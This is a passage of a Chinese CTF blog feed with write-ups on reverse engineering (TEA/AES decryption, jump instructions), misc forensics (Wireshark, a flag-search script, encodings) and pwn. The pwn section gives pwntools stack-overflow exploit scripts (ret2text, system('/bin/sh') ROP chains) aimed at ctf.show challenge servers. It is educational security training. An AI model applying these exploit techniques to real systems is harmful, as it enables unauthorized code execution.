&lt;&lt; <span class="number">4</span>) + key[<span class="number">0</span>]) ^ (r + sum) ^ ((r &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = l;</span><br><span class="line">    v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">4</span>] = &#123;<span class="number">370962600</span>, <span class="number">1695475146</span>, <span class="number">1118301157</span>, <span class="number">328319843</span>&#125;, key[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt(v + i, key);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x, %x, &quot;</span>, (v + i)[<span class="number">0</span>], (v + i)[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">c = [<span class="number">0x5a87be5e</span>, <span class="number">0x13e418d0</span>, <span class="number">0x66aaefdd</span>, <span class="number">0xb322754f</span>]</span><br><span class="line">key = <span class="string">b&#x27;win_crack_god!@#&#x27;</span></span><br><span class="line">cipher = <span class="string">b&#x27;&#x27;</span>.join([i.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> c])</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(cipher))</span><br></pre></td></tr></table></figure><ul><li><p>代码解释：来自Chatgpt<br>当我们观察到这段代码时，可以看到它使用了列表推导式和<code>join()</code>函数来将一组整数转换为一个字节字符串。</p><p>让我们逐步解释这段代码的功能：</p><ol><li><code>[i.to_bytes(4, &#39;little&#39;) for i in c]</code>：这是一个列表推导式，遍历列表<code>c</code>中的每个整数<code>i</code>，并将每个整数转换为一个4字节的小端字节序。<code>to_bytes(4, &#39;little&#39;)</code>方法将整数转换为一个字节字符串，其中参数4表示要生成的字节数，’little’表示使用小端字节序进行编码。</li><li><code>b&#39;&#39;.join(...)</code>：<code>join()</code>函数用于连接字符串。在这里，它将列表推导式生成的所有字节字符串连接在一起。<code>b&#39;&#39;</code>是一个空的字节字符串，作为连接时的分隔符。</li></ol><p>综合起来，<code>cipher = b&#39;&#39;.join([i.to_bytes(4, &#39;little&#39;) for i in c])</code>的作用是将列表<code>c</code>中的每个整数转换为4字节的小端字节序，并将它们连接成一个字节字符串。结果存储在<code>cipher</code>变量中，用于后续的解密操作。</p></li><li><p>至于填充模式，默认就是PKCS5Padding</p></li></ul><h1 id="黑客偷走的密码（AES）"><a href="#黑客偷走的密码（AES）" class="headerlink" title="黑客偷走的密码（AES）"></a>黑客偷走的密码（AES）</h1><h2 id="附件-1"><a href="#附件-1" class="headerlink" title="附件"></a>附件</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/1F5S5juDhDUdkdHiMMCesug?pwd=1111">https://pan.baidu.com/s/1F5S5juDhDUdkdHiMMCesug?pwd=1111</a><br>提取码：1111 </p></blockquote><p>描述：财务人员的电脑中了勒索病毒，重要账号的密码文件被加密了，必须向攻击者支付比特币才能获得解密密码。作为安全人员，你有办法还原文件，找回文件中的密码吗？</p><h2 id="考点：AES-WIN-API分析"><a href="#考点：AES-WIN-API分析" class="headerlink" title="考点：AES  WIN API分析"></a>考点：AES  WIN API分析</h2><p>插件识别出来是AES</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801230350033.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801230350033.png"  class="" lazyload></a><p>Key</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801231237661.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801231237661.png"  class="" lazyload></a><p>解题代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">k = [<span class="number">0x16157E2B</span>, <span class="number">0xA6D2AE28</span>, <span class="number">0x8815F7AB</span>, <span class="number">0x3C4FCF09</span>]</span><br><span class="line">key = <span class="string">b&quot;&quot;</span>.join([i.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> k ])</span><br><span class="line">cry = <span class="built_in">open</span>(<span class="string">&quot;flag.txt.cry&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plain = aes.decrypt(cry).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;plain text: <span class="subst">&#123;plain&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="汇编跳转指令解析"><a href="#汇编跳转指令解析" class="headerlink" title="汇编跳转指令解析"></a>汇编跳转指令解析</h1><ol><li>**<code>jmp</code>**（Jump）：无条件跳转指令。它会无条件地将程序的执行流程转移到指定的地址处，从而实现无条件的跳转。</li><li>**<code>jg</code>**（Jump If Greater）：有符号数比较跳转指令。当”大于”条件成立时，即前一个操作数大于后一个操作数时，执行跳转。</li><li>**<code>jl</code>**（Jump If Less）：有符号数比较跳转指令。当”小于”条件成立时，即前一个操作数小于后一个操作数时，执行跳转。</li><li>**<code>jge</code>**（Jump If Greater or Equal）：有符号数比较跳转指令。当”大于等于”条件成立时，即前一个操作数大于或等于后一个操作数时，执行跳转。</li><li>**<code>jle</code>**（Jump If Less or Equal）：有符号数比较跳转指令。当”小于等于”条件成立时，即前一个操作数小于或等于后一个操作数时，执行跳转。</li><li>**<code>je</code>**（Jump If Equal）：有符号数比较跳转指令。当”等于”条件成立时，即两个操作数相等时，执行跳转。</li><li>**<code>jne</code>**（Jump If Not Equal）：有符号数比较跳转指令。当”不等于”条件成立时，即两个操作数不相等时，执行跳转。</li></ol><p><strong>总结: 跳转指令一共四种</strong></p><ul><li><strong>无条件： jmp</strong></li><li><strong>比较：jg&gt; jl&lt;</strong> </li><li><strong>等号比较：jge&gt;&#x3D;  jle&lt;&#x3D;</strong>  </li><li><strong>等于比较：je&#x3D; jne&#x2F;&#x3D;</strong></li></ul><p>代码例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">compare:</span><br><span class="line">    ; Compare a and b</span><br><span class="line">    cmp  edi, esi    ; Compare a (edi) with b (esi)</span><br><span class="line">    </span><br><span class="line">    ; Jump if greater (a &gt; b)</span><br><span class="line">    jg   greater</span><br><span class="line">    </span><br><span class="line">    ; Jump if not greater (a &lt;= b)</span><br><span class="line">    jmp  not_greater</span><br><span class="line"></span><br><span class="line">    ; Jump if greater (a &gt; b)</span><br><span class="line">    jg   greater</span><br><span class="line">    </span><br><span class="line">    ; Jump if less (a &lt; b)</span><br><span class="line">    jl   less</span><br><span class="line"></span><br><span class="line">    ; Jump if equal (a == b)</span><br><span class="line">    je   equal</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Android-AES&quot;&gt;&lt;a href=&quot;#Android-AES&quot; class=&quot;headerlink&quot; title=&quot;Android AES&quot;&gt;&lt;/a&gt;Android AES&lt;/h1&gt;&lt;h2 id=&quot;附件&quot;&gt;&lt;a href=&quot;#附件&quot; class=&quot;head</summary>
      
    
    
    
    <category term="Reverse" scheme="https://kidder1.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://kidder1.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Misc_CTF</title>
    <link href="https://kidder1.github.io/2023/07/27/Misc_CTF/"/>
    <id>https://kidder1.github.io/2023/07/27/Misc_CTF/</id>
    <published>2023-07-27T01:54:12.000Z</published>
    <updated>2023-08-02T08:35:45.787Z</updated>
    
    <content type="html"><![CDATA[<h1 id="flag-为明文"><a href="#flag-为明文" class="headerlink" title="flag 为明文"></a>flag 为明文</h1><p>直接搜索，WireShark设置如下</p><a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727095518075.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727095518075.png"  class="" lazyload></a><p>关于分组字节流，请看</p><blockquote><ul><li>“分组字节流” 是数据包的原始二进制表示，以十六进制显示。</li><li>“分组列表” 是捕获到的数据包的可视化列表，显示数据包的摘要信息。</li><li>“分组详情” 提供选定数据包的深层解析，包括每个协议的详细信息。</li></ul></blockquote><h2 id="flag为编码"><a href="#flag为编码" class="headerlink" title="flag为编码"></a>flag为编码</h2><blockquote><p>flag的十六进制编码：666c6167</p></blockquote><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>通过脚本进行扫描，然后从扫描排查的输出进行判断flag的格式</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印可打印字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_re</span>(<span class="params">str1</span>):</span><br><span class="line">    str2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1.decode(<span class="string">&#x27;utf8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">126</span> &gt;= <span class="built_in">ord</span>(i) &gt;= <span class="number">33</span>:</span><br><span class="line">                str2 += i</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            str2 += <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> str2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文本函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">txt_wt</span>(<span class="params">name, txt1</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;a&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&#x27;filename:&#x27;</span> + name)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;flag:&#x27;</span> + txt1)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># 第一次运行，清空output文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_txt</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;clear output.txt!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归遍历的所有文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_bianli</span>():</span><br><span class="line">    <span class="comment"># 路径设置为当前目录</span></span><br><span class="line">    path = os.getcwd()</span><br><span class="line">    <span class="comment"># 返回文件下的所有文件列表</span></span><br><span class="line">    file_list = []</span><br><span class="line">    <span class="keyword">for</span> i, j, k <span class="keyword">in</span> os.walk(path):</span><br><span class="line">        <span class="keyword">for</span> dd <span class="keyword">in</span> k:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;.py&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dd <span class="keyword">and</span> <span class="string">&quot;output.txt&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dd:</span><br><span class="line">                file_list.append(os.path.join(i, dd))</span><br><span class="line">    <span class="keyword">return</span> file_list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找文件中可能为flag的字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">file_list, flag_list</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> file_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(i, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> f.readlines():</span><br><span class="line">                    j1 = str_re(j)  <span class="comment"># 可打印字符串</span></span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> flag_list:</span><br><span class="line">                        <span class="keyword">if</span> k <span class="keyword">in</span> j1:</span><br><span class="line">                            txt_wt(i, j1)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;filename:&#x27;</span>, i)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;flag:&#x27;</span>, j1)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;err&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_txt = [<span class="string">&#x27;flag&#123;&#x27;</span>, <span class="string">&#x27;666c6167&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;Zmxh&#x27;</span>, <span class="string">&#x27;&amp;#102&#x27;</span>, <span class="string">&#x27;666C6167&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空输出的文本文件</span></span><br><span class="line">clear_txt()</span><br><span class="line"><span class="comment"># 遍历文件名</span></span><br><span class="line">file_lt = file_bianli()</span><br><span class="line"><span class="comment"># 查找flag关键字</span></span><br><span class="line">flag(file_lt, flag_txt)</span><br></pre></td></tr></table></figure><h3 id="三种硬编码区分"><a href="#三种硬编码区分" class="headerlink" title="三种硬编码区分"></a>三种硬编码区分</h3><ol><li>URL编码（URL Encoding）： <strong>URL编码也称为百分号编码（Percent Encoding</strong>），是一种用于在URL中表示特殊字符的编码方式。它将URL中的非字母数字字符转换为特殊格式：%xx，其中xx是字符的十六进制ASCII码表示。这样做是为了避免特殊字符与URL的语法冲突。<br>例如，空格字符（ASCII码为32）在URL编码后将变成”%20”。其他特殊字符也有相应的编码形式。</li></ol><ul><li>字符串：Hello, World!</li><li>URL编码后：Hello%2C%20World%21<br>厨子处理<a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727134323349.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727134323349.png"  class="" lazyload></a></li></ul><ol start="2"><li>Unicode编码： Unicode编码是一种字符编码标准，<strong>用于表示世界上所有字符的唯一代码点</strong>。它为每个字符分配了一个唯一的整数值，称为Unicode码点。不同的字符集如UTF-8、UTF-16和UTF-32等以不同方式表示Unicode字符。</li></ol><ul><li>字符：爱 (中文“爱”字)</li><li>Unicode码点：U+7231<a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727134405109.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727134405109.png"  class="" lazyload></a></li></ul><ol start="3"><li><p>HTML实体编码（HTML Entity Encoding）： HTML实体编码用于在HTML文档中表示特殊字符，比如用于显示保留字符（例如小于号和大于号）或不能在HTML文档中直接显示的字符（如版权符号）。</p><p>它的形式是<code>&amp;entity;</code>，其中entity是一个预定义的名称或数字引用，代表特定字符的编码值。</p></li></ol><ul><li>特殊字符：小于号 (&lt;)</li><li>HTML实体编码：&lt;</li></ul><p>联系和区别：</p><ul><li>URL编码和HTML实体编码都是用于在特定上下文中转义特殊字符，以避免冲突或表示不可见字符。</li><li>Unicode编码是字符的标准化表示形式，用于标识字符在全球范围内的唯一代码点。</li></ul><p>识别：</p><ul><li><p>URL编码和HTML实体编码通常以特定的格式出现，如”%xx”和”&entity;”。</p></li><li><p>Unicode编码通常以U+开头，后跟字符的十六进制码点表示。</p><a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727134458275.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727134458275.png"  class="" lazyload></a></li></ul><h3 id="压缩包处理"><a href="#压缩包处理" class="headerlink" title="压缩包处理"></a>压缩包处理</h3><blockquote><p>注：导出文件请转成原始010二进制各式进行导出，防止有不可打印字符没有导出</p></blockquote><a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727133555658.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727133555658.png"  class="" lazyload></a><p>定位到包的位置，选择压缩包格式，用原格式导出即可</p><a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727133705093.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727133705093.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727133805684.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727133805684.png"  class="" lazyload></a><p><strong><a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727133856790.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727133856790.png"  class="" lazyload></a></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;flag-为明文&quot;&gt;&lt;a href=&quot;#flag-为明文&quot; class=&quot;headerlink&quot; title=&quot;flag 为明文&quot;&gt;&lt;/a&gt;flag 为明文&lt;/h1&gt;&lt;p&gt;直接搜索，WireShark设置如下&lt;/p&gt;
&lt;a class=&quot;simple-lightb</summary>
      
    
    
    
    <category term="Misc" scheme="https://kidder1.github.io/categories/Misc/"/>
    
    
    <category term="Misc" scheme="https://kidder1.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>PWN_CTF</title>
    <link href="https://kidder1.github.io/2023/07/24/Pwn_CTF/"/>
    <id>https://kidder1.github.io/2023/07/24/Pwn_CTF/</id>
    <published>2023-07-24T02:24:36.000Z</published>
    <updated>2023-08-17T12:40:45.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><h2 id="pwn37-38-return-text"><a href="#pwn37-38-return-text" class="headerlink" title="pwn37&#x2F;38(return text)"></a>pwn37&#x2F;38(return text)</h2><blockquote><p>ret2text (Return-to-text&#x2F;Return-to-code): ret2text 是一种利用栈溢出等漏洞，将程序控制流导向程序本身的代码区域（text&#x2F;code segment）的技术。在许多程序中，代码区域是可执行的，因此攻击者可以通过改变程序执行流程，使其执行恶意的代码。一般情况下，攻击者会在栈上放置一个指向代码区域中恶意代码的地址，然后通过溢出等漏洞改变函数的返回地址，使程序跳转到恶意代码并执行.。 </p></blockquote><h3 id="查看内存常用命令"><a href="#查看内存常用命令" class="headerlink" title="查看内存常用命令"></a>查看内存常用命令</h3><blockquote><p>dq      x&#x2F;10xg       p&#x2F;x    telescope </p></blockquote><p>GDB测偏移</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725170934385.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725170934385.png"  class="" lazyload></a><p>关于栈平衡的问题：如果正常的payload打不通，就在payload前面加一个ret的地址进行栈平衡，让继续执行下一个指令。</p><p>gdb调试system成功，rbp下面就是返回地址，可以通过gdb查看是否改写成功。</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725184203864.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725184203864.png"  class="" lazyload></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28119</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400657</span></span><br><span class="line">ret = <span class="number">0x40066D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) +p64(ret)+p64(backdoor)<span class="comment"># 放一个ret平衡栈，在rop链子的前面</span></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn39（没有后门函数）"><a href="#pwn39（没有后门函数）" class="headerlink" title="pwn39（没有后门函数）"></a>pwn39（没有后门函数）</h2><ul><li><p>注意点：在32位置中plt后面默认跟的是返回地址，所以函数的plt和参数中间要给返回补充padding</p></li><li><p>更好的理解：调用一个函数的时候要对应一个返回地址；也就是说，如果在system之后夺得shell的话，那就不需要在添加返回地址了</p><blockquote><p>32：sys_plt + ret_addr + bin&#x2F;sh 必须添加</p><p>64：pop_rdi + bin&#x2F;sh + system +ret_addr 可加可不加</p></blockquote></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28134</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x08048750</span></span><br><span class="line">system_plt = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>,system_plt)</span><br><span class="line"><span class="comment"># 这里0也可以用ret来代替，补充plt的返回地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>)+p32(system_plt)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;Just easy ret2text&amp;&amp;32bit&#x27;)</span></span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn40（没有后门函数，x64的寄存器传参顺序）"><a href="#pwn40（没有后门函数，x64的寄存器传参顺序）" class="headerlink" title="pwn40（没有后门函数，x64的寄存器传参顺序）"></a>pwn40（没有后门函数，x64的寄存器传参顺序）</h2><p>知识点传参顺序：</p><ol><li><strong>存器传参（Register Parameter 